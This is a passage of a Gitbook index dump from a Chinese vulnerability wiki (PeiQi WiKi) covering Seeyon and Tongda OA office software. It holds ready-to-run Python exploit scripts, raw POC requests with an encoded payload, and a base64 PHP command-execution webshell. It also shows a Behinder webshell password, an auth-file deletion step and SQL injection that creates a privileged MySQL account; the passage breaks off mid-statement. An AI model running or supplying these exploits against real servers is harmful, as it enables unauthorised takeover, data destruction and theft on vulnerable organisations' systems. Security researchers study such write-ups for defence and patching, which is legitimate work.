RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6 originalFileId=wV66 originalCreateDate=wUghPB3szB3Xwg66 FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6 needReadFile=yRWZdAS6 originalCreateDate=wLSGP4oEzLKAz4=iz=66 \"+excuteCmd(request.getParameter(\"cmd\")) + \"\");}else{out.println(\":-)\");}%>>a6e4f045d4b8506bf492ada7e3390d7ce 出现如图响应则为上传成功 访问 http://xxx.xxx.xxx.xxx:8088/seeyon/testtesta.jsp?pwd=calsee&cmd=cmd+/c+dir 漏洞利用POC Goby中含有漏洞检测POC PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/OA产品漏洞/致远OA/致远OA ajax.do登录绕过 任意文件上传.html":{"url":"PeiQi_Wiki/OA产品漏洞/致远OA/致远OA ajax.do登录绕过 任意文件上传.html","title":"致远OA ajax.do登录绕过 任意文件上传","keywords":"","body":"致远OA ajax.do登录绕过 任意文件上传 CNVD-2021-01627 漏洞描述 致远OA是一套办公协同管理软件。近日，奇安信CERT监测到致远OA的相关漏洞信息。由于致远OA旧版本某些接口存在未授权访问，以及部分函数存在过滤不足，攻击者通过构造恶意请求，可在无需登录的情况下上传恶意脚本文件，从而控制服务器。致远OA官方已针对该漏洞提供补丁。鉴于漏洞危害较大，建议用户尽快应用补丁更新。 漏洞影响 [!NOTE] 致远OA V8.0 致远OA V7.1、V7.1SP1 致远OA V7.0、V7.0SP1、V7.0SP2、V7.0SP3 致远OA V6.0、V6.1SP1、V6.1SP2 致远OA V5.x 致远OA G6 漏洞复现 通过请求判断是否可能存在漏洞 http://xxx.xxx.xxx.xxx/seeyon/thirdpartyController.do.css/..;/ajax.do 查看是否出现如上图异常，若存在则可能出现漏洞 出现异常：java.lang.NullPointerException:null 然后调用未授权的文件上传接口上传webshell文件 POC请求包如下 POST /seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip HTTP/1.1 Host: 127.0.0.1 Connection: close Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 loginPageURL=; login_locale=zh_CN; Content-Type: application/x-www-form-urlencoded managerMethod=validate&arguments=%1F%C2%8B%08%00%00%00%00%00%00%0AuTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28%2A%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%C2%9D%C2%9D%C2%87%C3%B6%C2%A8%1F%C2%A6I%C3%99y%C3%B8%09%C3%8B%C3%9C%5DH%03%0F%C3%A3%C3%9A%C2%87%C2%9D%C2%98%C3%9C%C3%80%2C%C2%A9%5Cn%C3%8CJ%C3%8B+sE%C3%A1%C2%B6%25%C2%B5%C2%8CE%C3%8ERe%C3%81%2C.%C3%96%5C%12%402%C3%8F%01%C2%AF%C3%A7k%C2%A2%14%C2%AE6%C2%96%C2%8F%C2%83%C2%97%C3%A2%28.%22%5B%C2%93%7CH%C3%B4%0Ap%C2%B8pC%16m%C2%B4a%25%C2%85%C3%83g%27R%C2%AE%5B%C2%A2%26%C2%80%C3%A8%21%141gk%C3%82%C3%952+%C2%96D%C2%9C%01q%5C%C3%81%1A%C2%9F%2C8K%13%06%C3%B4%3D%5D%C2%A38mx%C3%93%C3%8F-%7E%25%C2%80%C2%A5Z%7C%2A%C2%A3%C2%B8%C2%B6%C2%B1%C3%89e%24%15%C2%BB%C2%B0%C3%BC%07%C3%B0%2F%C3%9FlQ%0F%5DqQY%C2%A6%C2%9A%C2%B8%C3%9C%C3%B0Q%12%C2%95%C3%942%C2%95%C2%9B%C2%B48%C3%BA%C2%B6%19%C2%B0%C2%B6%21%C2%9CA5%C2%99Q%C2%9D%1B%60%C3%8B%C3%822T%0C%C2%A2L%C2%97%C3%A7%C2%AD%C3%9EA%1C%07%14%C2%A3%C2%92%C3%84M%C3%A2%C3%B1%C3%8A%00PZ%C2%A6%C3%B4%C2%96%1F%5C%C2%A1%C2%B1J%1Dc%C3%A3%C3%AF%C2%B92%00%C3%BC%C3%86%C2%B7%C2%AB%00y%C2%A6%C2%8A%C2%A5E%06-%C2%84G4%3E%16%C2%9A%C2%AB%5CZ%C2%B6vk%C2%A2b%C2%9B%C3%A0%C3%9C%3E%C2%B6%C3%98%C2%B2%28%C2%A5%C2%9Bi%C2%89%C3%96%C2%A4%C3%84.%C2%81%C2%AC3%3D%C2%8FN%26%C3%BBLsZ%C3%A7%C3%BDl%1B%C2%B5%C3%9E%2A%C2%A09%C2%A0%C3%B9%C2%BB%C3%A7-RB%40%C3%B0%15%C2%8A%25%C2%863%C3%A1%00%C2%97%C2%AB%C3%84%25%C3%80wn%2C%C2%B2%0F%C3%BB%C2%81%7D%C3%98T%5B%C3%83%C3%86V%C2%A8%C2%9F%C2%B7%07i%60%21i%048%C3%BD%C3%96%C3%94%00%09Wh%C2%AA%C2%86e%C2%94%03%5B%C3%B3%11%C3%94%C2%A4%C3%94%C2%A9%C3%8E%C2%A3%3D%C2%87%C2%AFN%1B%C3%A3%C3%B8%C2%8D%5E%13%C2%88%C3%A1%1C%C3%93%C2%BA%C2%AA%C2%81K%14%2COW%13U%C3%9F+%C3%B9%C2%90%C2%85k%1A%C2%83c%C3%AE%C3%A3%0D%2As%C3%9B%04%C3%BE%C2%91%C3%93%C3%83%3AV%C2%8D%C3%93%C2%85%23%3F%C3%81V%C3%A5%C3%87%1F%C3%BE%C2%8C%C3%AC_%C3%BFL%C3%A4JB%C2%B2%C3%96%C3%88%C2%A7u%C2%BE%40%C3%A5%27%C3%AB7%7C%C3%AD%3Cr%C2%89%C3%8E%C3%93%C3%BA%C3%84P%0C%12P5zm%7Dj%C2%BD%C3%86%C2%AF_k%23O%C3%8FT%0Eb%C2%AB%12%C3%8E.k%C3%93%7C%2CRY%140%C2%AC%267h%0Cs%C3%97%C3%807%C3%BA6%C3%9D%C3%AB%C3%8AB%09%C3%959%C3%8Dkq%C2%B7%C3%8B%C2%9B%C3%BE%C3%A0T%C2%BC%C2%8Ftb%C3%93%5E%C2%95%C2%97%2B%0CL%1D%03%7E%C2%9F%C3%9B%C2%9C%C3%8E%1E%C2%89%C3%BE%C3%B6G%0Ej%C2%9AN%C2%ADK%C2%8E1%C3%B53%C2%A11%C3%90%C3%B8%C3%A1%C3%8A%C2%8D%14%C3%962%C2%84%C2%90%C3%86G%C3%BD%C3%90Kh%2CRP%05MO%C3%AF%C2%B9q%0EE%7D%08imw%C3%93q%C3%93%C2%93%C2%80S%2A%C3%87%C2%9C%C2%B0%C2%AE%C2%A8%C2%B3%C2%BB%C3%B0Z%C2%B4u%5D%15.%C2%BF%7F%7C%C2%9Fr%26%C3%8D%C2%A3%3EA%29%C3%A8O%5E%C2%B4%C3%B9%C2%B7%C3%A1%C3%8C%031%C2%A4%C2%83%0E%C3%AFw%3B%C3%A3%C2%9F%2B%C3%B5%C3%BE%3B%C3%95%C2%AD%C3%99%C2%9Dim%5B%C2%A6w%07%C3%AC%C2%B7%C3%B7%24%3F%C2%9D%28%40%C2%B3%04%1E%C2%BEt%C2%8E%C2%87%C3%85%C3%97%C3%A7%C2%8FK%C3%A2%C3%A3%C2%9E%C3%A97%0C%C2%8Ez%1F%C3%81%C3%BFO%17%C3%A08%C3%B5%C2%A8c%3F%C2%BE%C3%97%7B%C2%90%12%C3%90%3B1i%C3%A6d%080eY%C3%B6%1E%5E%C2%BB%3F%C3%A8r%C2%A4%0B%C3%B2%C2%B5%C2%BE%C2%B3K%C3%AEu%C3%BF%C3%BE%17%1CR%C2%AD%17W%05%00%00 冰蝎3 默认马pass : rebeyond webshell地址: http://xxx.xxx.xxx.xxx/seeyon/PeiQi.jspx 成功会返回 { \"message\":null, \"details\":null, \"code\":\"0436821967\" } 失败会返回 { \"message\": \"被迫下线，原因：与服务器失去连接\", \"code\": \"-1\", \"details\": null } 上传后请求webshell地址，访问返回出现如下图则成功写入 [!NOTE] 访问状态码为 200 成功 访问状态码为 404 失败 使用冰蝎连接:rebeyond 漏洞利用POC import requests import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: 致远OA 多个版本 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url_2 = target_url + \"/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip\" print('\\033[36m[o] 正在请求: {}'.format(vuln_url_2)) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", } data = \"managerMethod=validate&arguments=%1F%C2%8B%08%00%00%00%00%00%00%0AuTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28%2A%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%C2%9D%C2%9D%C2%87%C3%B6%C2%A8%1F%C2%A6I%C3%99y%C3%B8%09%C3%8B%C3%9C%5DH%03%0F%C3%A3%C3%9A%C2%87%C2%9D%C2%98%C3%9C%C3%80%2C%C2%A9%5Cn%C3%8CJ%C3%8B+sE%C3%A1%C2%B6%25%C2%B5%C2%8CE%C3%8ERe%C3%81%2C.%C3%96%5C%12%402%C3%8F%01%C2%AF%C3%A7k%C2%A2%14%C2%AE6%C2%96%C2%8F%C2%83%C2%97%C3%A2%28.%22%5B%C2%93%7CH%C3%B4%0Ap%C2%B8pC%16m%C2%B4a%25%C2%85%C3%83g%27R%C2%AE%5B%C2%A2%26%C2%80%C3%A8%21%141gk%C3%82%C3%952+%C2%96D%C2%9C%01q%5C%C3%81%1A%C2%9F%2C8K%13%06%C3%B4%3D%5D%C2%A38mx%C3%93%C3%8F-%7E%25%C2%80%C2%A5Z%7C%2A%C2%A3%C2%B8%C2%B6%C2%B1%C3%89e%24%15%C2%BB%C2%B0%C3%BC%07%C3%B0%2F%C3%9FlQ%0F%5DqQY%C2%A6%C2%9A%C2%B8%C3%9C%C3%B0Q%12%C2%95%C3%942%C2%95%C2%9B%C2%B48%C3%BA%C2%B6%19%C2%B0%C2%B6%21%C2%9CA5%C2%99Q%C2%9D%1B%60%C3%8B%C3%822T%0C%C2%A2L%C2%97%C3%A7%C2%AD%C3%9EA%1C%07%14%C2%A3%C2%92%C3%84M%C3%A2%C3%B1%C3%8A%00PZ%C2%A6%C3%B4%C2%96%1F%5C%C2%A1%C2%B1J%1Dc%C3%A3%C3%AF%C2%B92%00%C3%BC%C3%86%C2%B7%C2%AB%00y%C2%A6%C2%8A%C2%A5E%06-%C2%84G4%3E%16%C2%9A%C2%AB%5CZ%C2%B6vk%C2%A2b%C2%9B%C3%A0%C3%9C%3E%C2%B6%C3%98%C2%B2%28%C2%A5%C2%9Bi%C2%89%C3%96%C2%A4%C3%84.%C2%81%C2%AC3%3D%C2%8FN%26%C3%BBLsZ%C3%A7%C3%BDl%1B%C2%B5%C3%9E%2A%C2%A09%C2%A0%C3%B9%C2%BB%C3%A7-RB%40%C3%B0%15%C2%8A%25%C2%863%C3%A1%00%C2%97%C2%AB%C3%84%25%C3%80wn%2C%C2%B2%0F%C3%BB%C2%81%7D%C3%98T%5B%C3%83%C3%86V%C2%A8%C2%9F%C2%B7%07i%60%21i%048%C3%BD%C3%96%C3%94%00%09Wh%C2%AA%C2%86e%C2%94%03%5B%C3%B3%11%C3%94%C2%A4%C3%94%C2%A9%C3%8E%C2%A3%3D%C2%87%C2%AFN%1B%C3%A3%C3%B8%C2%8D%5E%13%C2%88%C3%A1%1C%C3%93%C2%BA%C2%AA%C2%81K%14%2COW%13U%C3%9F+%C3%B9%C2%90%C2%85k%1A%C2%83c%C3%AE%C3%A3%0D%2As%C3%9B%04%C3%BE%C2%91%C3%93%C3%83%3AV%C2%8D%C3%93%C2%85%23%3F%C3%81V%C3%A5%C3%87%1F%C3%BE%C2%8C%C3%AC_%C3%BFL%C3%A4JB%C2%B2%C3%96%C3%88%C2%A7u%C2%BE%40%C3%A5%27%C3%AB7%7C%C3%AD%3Cr%C2%89%C3%8E%C3%93%C3%BA%C3%84P%0C%12P5zm%7Dj%C2%BD%C3%86%C2%AF_k%23O%C3%8FT%0Eb%C2%AB%12%C3%8E.k%C3%93%7C%2CRY%140%C2%AC%267h%0Cs%C3%97%C3%807%C3%BA6%C3%9D%C3%AB%C3%8AB%09%C3%959%C3%8Dkq%C2%B7%C3%8B%C2%9B%C3%BE%C3%A0T%C2%BC%C2%8Ftb%C3%93%5E%C2%95%C2%97%2B%0CL%1D%03%7E%C2%9F%C3%9B%C2%9C%C3%8E%1E%C2%89%C3%BE%C3%B6G%0Ej%C2%9AN%C2%ADK%C2%8E1%C3%B53%C2%A11%C3%90%C3%B8%C3%A1%C3%8A%C2%8D%14%C3%962%C2%84%C2%90%C3%86G%C3%BD%C3%90Kh%2CRP%05MO%C3%AF%C2%B9q%0EE%7D%08imw%C3%93q%C3%93%C2%93%C2%80S%2A%C3%87%C2%9C%C2%B0%C2%AE%C2%A8%C2%B3%C2%BB%C3%B0Z%C2%B4u%5D%15.%C2%BF%7F%7C%C2%9Fr%26%C3%8D%C2%A3%3EA%29%C3%A8O%5E%C2%B4%C3%B9%C2%B7%C3%A1%C3%8C%031%C2%A4%C2%83%0E%C3%AFw%3B%C3%A3%C2%9F%2B%C3%B5%C3%BE%3B%C3%95%C2%AD%C3%99%C2%9Dim%5B%C2%A6w%07%C3%AC%C2%B7%C3%B7%24%3F%C2%9D%28%40%C2%B3%04%1E%C2%BEt%C2%8E%C2%87%C3%85%C3%97%C3%A7%C2%8FK%C3%A2%C3%A3%C2%9E%C3%A97%0C%C2%8Ez%1F%C3%81%C3%BFO%17%C3%A08%C3%B5%C2%A8c%3F%C2%BE%C3%97%7B%C2%90%12%C3%90%3B1i%C3%A6d%080eY%C3%B6%1E%5E%C2%BB%3F%C3%A8r%C2%A4%0B%C3%B2%C2%B5%C2%BE%C2%B3K%C3%AEu%C3%BF%C3%BE%17%1CR%C2%AD%17W%05%00%00\" requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url_2, headers=headers, data=data, verify=False) test_webshell(target_url) def test_webshell(target_url): webshell_url = target_url + \"/seeyon/PeiQi.jspx\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=webshell_url, timeout=10, verify=False, headers=headers) print(\"\\033[32m[o] 正在请求 : {}/seeyon/PeiQi.jspx\\033[0m\".format(target_url)) if response.status_code == 200: print(\"\\033[32m[o] 目标 {} 成功上传 webshell : {}/seeyon/PeiQi.jspx\\033[0m\".format(target_url,target_url)) print(\"\\033[32m[o] webshell地址：{}/seeyon/PeiQi.jspx \\033[0m\".format(target_url)) print(\"\\033[32m[o] 冰蝎3默认马 pass ：rebeyond \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] 目标漏洞无法利用，写入失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 目标漏洞无法利用，写入失败 {} \\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) 文件编码脚本, 自行进行自定义调试 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/OA产品漏洞/致远OA/致远OA Session泄漏漏洞.html":{"url":"PeiQi_Wiki/OA产品漏洞/致远OA/致远OA Session泄漏漏洞.html","title":"致远OA Session泄漏漏洞","keywords":"","body":"致远OA Session泄漏漏洞 漏洞描述 通过使用存在漏洞的请求时，会回显部分用户的Session值，导致出现任意登录的情况 影响版本 [!NOTE] 未知 漏洞复现 请求 http://xxx.xxx.xxx.xxx/yyoa/ext/https/getSessionList.jsp?cmd=getAll 回显Session则存在漏洞 参考文章 零组文库 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/OA产品漏洞/通达OA/":{"url":"PeiQi_Wiki/OA产品漏洞/通达OA/","title":"通达OA","keywords":"","body":"通达OA 通达OA部分漏洞信息整合 通达OA v11.2后台任意文件上传漏洞 通达OA v11.x-v11.5任意用户登录 通达OA v11.6 任意文件删除&RCE 通达OA v11.7后台SQL注入漏洞 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/OA产品漏洞/通达OA/通达OA v11.2后台任意文件上传漏洞.html":{"url":"PeiQi_Wiki/OA产品漏洞/通达OA/通达OA v11.2后台任意文件上传漏洞.html","title":"通达OA v11.2后台任意文件上传漏洞","keywords":"","body":"通达OA v11.2后台任意文件上传漏洞 漏洞描述 通达OA v11.2后台存在文件上传漏洞，允许通过绕过黑名单的方法来上传恶意文件，导致服务器被攻击 影响版本 [!NOTE] 通达OA v11.2 环境搭建 通达OA v11.2下载链接 下载后按步骤安装即可 漏洞复现 该漏洞存在于后台，需要通过登录后才能进行使用 登录后点击 菜单 -> 系统管理 -> 附件管理 点击添加附录存储管理添加如下(存储目录为 webroot 目录，默认为 D:/MYOA/webroot/) 点击 组织 -> 系统管理员 -> 上传附件 抓包使用 windows 的绕过方法 shell.php -> shell.php. [!NOTE] 2012 为目录 1717872192 为拼接的文件名 最后的shell名字为 1717872192.shell.php 访问木马文件 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/OA产品漏洞/通达OA/通达OA v11.6 任意文件删除&RCE.html":{"url":"PeiQi_Wiki/OA产品漏洞/通达OA/通达OA v11.6 任意文件删除&RCE.html","title":"通达OA v11.6 任意文件删除&RCE","keywords":"","body":"通达OA v11.6 任意文件删除&RCE 漏洞描述 通过任意文件漏洞删除上传点包含的身份验证文件，从而造成未授权访问实现任意文件上传 漏洞影响 [!NOTE] 通达OA v11.6 环境搭建 通达OA v11.6下载链接 下载完毕点击安装即可 漏洞复现 使用解密工具 SeayDzend(zend解密工具) 对通达OA的加密代码进行解密 [!NOTE] 解密工具已经放在目录下的POC目录中 解密完成后查看 webroot\\general\\data_center\\utils\\upload.php 文件 \\r\\n\\r\\n\"; ?> 在第一行包含了文件 auth.inc.php include_once \"inc/auth.inc.php\"; 可以看到这个文件用于检验是否登录，未登录的情况无法利用这个漏洞 查看 \\webroot\\module\\appbuilder\\assets\\print.php文件 这里可以看到 页面获取 guid参数的值 使用file_exists函数判断文件是否存在 并未进行校验 就执行unlink删除文件 可以本地在 \\webroot\\inc 目录创建 1.txt 文件 然后访问 http://xxx.xxx.xxx.xxx/module/appbuilder/assets/print.php?guid=../../../webroot/inc/1.txt 就会删除这个 1.txt 文件，也代表可以删除 auth.inc.php 登录检验文件 回到 upload.php 文件进行代码审计 判断变量 $action 是否为 upload，再判断文件类型，如果不为 xls 和 img 则进入else分支 else { $uploaddir = MYOA_ATTACH_PATH . \"/data_center/attachment/\"; if (!is_dir(MYOA_ATTACH_PATH . \"/data_center/attachment\")) { if (!is_dir(MYOA_ATTACH_PATH . \"/data_center\")) { mkdir(MYOA_ATTACH_PATH . \"/data_center\"); } mkdir(MYOA_ATTACH_PATH . \"/data_center/attachment\"); } if (isset($from_rep)) { if (($from_rep != \"\") && ($from_rep[0] == \"{\")) { $repkid = GetRepKIDBySendId($from_rep); if ($repkid != $to_rep) { if (file_exists($uploaddir . \"/\" . $repkid . \"_\" . $filename)) { copy($uploaddir . \"/\" . $repkid . \"_\" . $filename, $uploaddir . \"/\" . $to_rep . \"_\" . $filename); } } } else { $arr = explode(\",\", $from_rep); for ($i = 0; $i 在这段代码中，如果不存在 $from_rep 变量则会跳到如下代码 else { $s_n = $_FILES[\"FILE1\"][\"name\"]; if ($s_n[0] != \"{\") { $s_n = $repkid . \"_\" . $s_n; } if (move_uploaded_file($_FILES[\"FILE1\"][\"tmp_name\"], $uploaddir . $s_n)) { } } 这里直接将 $repkid 变量进行拼接,也就是说可以通过目录穿越来上传恶意文件到指定目录 [!NOTE] 这里需要利用file_exists函数的漏洞构造/.<>./.<>./.<>./ 逃逸出来 使用POC来利用漏洞 [!NOTE] 注意在删除验证身份的文件后，会造成后台页面出现如下图，使用前备份文件 漏洞利用POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import re import base64 import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: 通达OA v11.6 任意文件删除&RCE \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCmd >>> whoami \\033[0m') print('+------------------------------------------') def POC_1(target_url): check_url = target_url + \"/module/appbuilder/assets/print.php\" try: check_url_response = requests.get(url = check_url) if check_url_response.status_code == 200: print(\"\\033[32m[o] 存在 /module/appbuilder/assets/print.php 可能含有通达OA v11.6 任意文件删除&RCE漏洞\\033[0m\") input(\"\\033[32m[o] 此漏洞会对真实环境造成影响，请在授权的情况下利用此漏洞，按下任意键继续..... \\033[0m\") else: print(\"\\033[31m[x] 不存在 /module/appbuilder/assets/print.php 漏洞利用失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败，{} \\033[0m\".format(e)) sys.exit(0) def POC_2(target_url): unlink_url = target_url + \"/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php\" try: unlink_response = requests.get(url = unlink_url) if unlink_response.status_code == 200: print(\"\\033[32m[o] 成功删除校验文件 auth.inc.php \\033[0m\") else: print(\"\\033[31m[x] 删除校验文件 auth.inc.php 失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败，{} \\033[0m\".format(e)) sys.exit(0) def POC_3(target_url, payload_php): \"\"\" (绕过的webshell) exec(\"cmd /c \".$command); $stdout = $exec->StdOut(); $stroutput = $stdout->ReadAll(); echo $stroutput; ?> \"\"\" vuln_url = target_url + \"/general/data_center/utils/upload.php?action=upload&filetype=peiqi&repkid=/.<>./.<>./.<>./\" files = {'FILE1': ('peiqi.php', payload_php)} try: vuln_response = requests.post(url = vuln_url,files=files) if vuln_response.status_code == 200: print(\"\\033[32m[o] 成功写入webshell文件: _peiqi.php \\033[0m\") print(\"\\033[32m[o] webshell地址为: {}/_peiqi.php \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] 写入webshell文件失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败，{} \\033[0m\".format(e)) sys.exit(0) def POC_4(target_url, cmd): cmd_url = target_url + \"/_peiqi.php?peiqi={}\".format(cmd) try: cmd_response = requests.get(url = cmd_url) if cmd_response.status_code == 200: print(\"\\033[32m[o] 正在执行命令: {} \\033[0m\".format(cmd_url)) print(\"\\033[32m[o] 响应为: \\n{} \\033[0m\".format(cmd_response.text)) else: print(\"\\033[31m[x] 命令执行失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败，{} \\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) POC_2(target_url) payload_php = base64.b64decode(\"PD9waHAKICAgICRjb21tYW5kPSRfR0VUWydwZWlxaSddOwogICAgJHdzaCA9IG5ldyBDT00oJ1dTY3JpcHQuc2hlbGwnKTsKICAgICRleGVjID0gJHdzaC0+ZXhlYygiY21kIC9jICIuJGNvbW1hbmQpOwogICAgJHN0ZG91dCA9ICRleGVjLT5TdGRPdXQoKTsKICAgICRzdHJvdXRwdXQgPSAkc3Rkb3V0LT5SZWFkQWxsKCk7CiAgICBlY2hvICRzdHJvdXRwdXQ7Cj8+\").decode(\"utf-8\") POC_3(target_url, payload_php) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": sys.exit(0) else: POC_4(target_url, cmd) PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/OA产品漏洞/通达OA/通达OA v11.7后台SQL注入.html":{"url":"PeiQi_Wiki/OA产品漏洞/通达OA/通达OA v11.7后台SQL注入.html","title":"通达OA v11.7后台SQL注入","keywords":"","body":"通达OA v11.7后台SQL注入 漏洞描述 通达OA v11.7后台存在SQL注入，可通过此漏洞写入恶意后门文件攻击目标服务器 漏洞影响 [!NOTE] 通达OA v11.7 环境搭建 环境地址 漏洞复现 在 general/hr/manage/query/delete_cascade.php 文件中 首先判断$condition_cascade是否为空，如果不为空，则将其中的\\'替换为'。为什么要这样替换呢，主要是因为V11.7版本中，注册变量时考虑了安全问题，将用户输入的字符用addslashes函数进行保护，如下： inc/common.inc.php 代码 使用盲注对SQL注入进行测试 触发了通达OA的SQL注入拦截 inc/conn.php文件中找到过滤机制如下: 其过滤了一些字符，但是并非无法绕过，盲注的核心是：substr、if等函数，均未被过滤，那么只要构造MySQL报错即可配合if函数进行盲注了，翻看局外人师傅在补天白帽大会上的分享，发现power(9999,99)也可以使数据库报错，所以构造语句： select if((substr(user(),1,1)='r'),1,power(9999,99)) # 当字符相等时，不报错，错误时报错 添加SQL数据库用户 grant all privileges ON mysql.* TO 'peiqi'@'%' IDENTIFIED BY 'peiqiABC@123' WITH GRANT OPTION 访问 http://xxx.xxx.xxx.xxx/general/hr/manage/query/delete_cascade.php?condition_cascade=grant all privileges ON mysql.* TO 'peiqi'@'%' IDENTIFIED BY 'peiqiABC@123' WITH GRANT OPTION 进入 Myoa/mysql5/bin 目录 执行 mysql -upeiqi -p 输入密码查询所有用户 发现成功执行添加一个账户 然后该用户是对mysql数据库拥有所有权限的,然后给自己加权限： UPDATE `mysql`.`user` SET `Password` = '*FBCFBB73CF21D4F464A95E775B40AF27A679CD2D', `Select_priv` = 'Y', `Insert_priv` = 'Y', `Update_priv` = 'Y', `Delete_priv` = 'Y', `Create_priv` = 'Y', `Drop_priv` = 'Y', `Reload_priv` = 'Y', `Shutdown_priv` = 'Y', `Process_priv` = 'Y', `File_priv` = 'Y', `Grant_priv` = 'Y', `References_priv` = 'Y', `Index_priv` = 'Y', `Alter_priv` = 'Y', `Show_db_priv` = 'Y', `Super_priv` = 'Y', `Create_tmp_table_priv` = 'Y', `Lock_tables_priv` = 'Y', `Execute_priv` = 'Y', `Repl_slave_priv` = 'Y', `Repl_client_priv` = 'Y', `Create_view_priv` = 'Y', `Show_view_priv` = 'Y', `Create_routine_priv` = 'Y', `Alter_routine_priv` = 'Y', `Create_user_priv` = 'Y', `Event_priv` = 'Y', `Trigger_priv` = 'Y', `Create_tablespace_priv` = 'Y', 